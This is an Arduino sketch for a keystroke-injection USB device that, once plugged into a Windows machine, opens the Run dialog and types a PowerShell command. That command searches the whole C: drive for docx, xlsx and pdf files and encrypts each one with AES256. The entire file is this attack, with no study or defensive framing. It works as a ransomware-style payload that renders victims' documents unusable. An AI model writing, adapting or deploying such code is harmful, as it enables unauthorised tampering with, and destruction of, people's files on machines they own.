#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"Get-ChildItem C:\\ -Recurse | Where-Object { $_.Extension -match 'docx|xlsx|pdf' } | ForEach-Object {Protect-File -Path $_.FullName -Algorithm AES256}\""));
}

void loop() {}
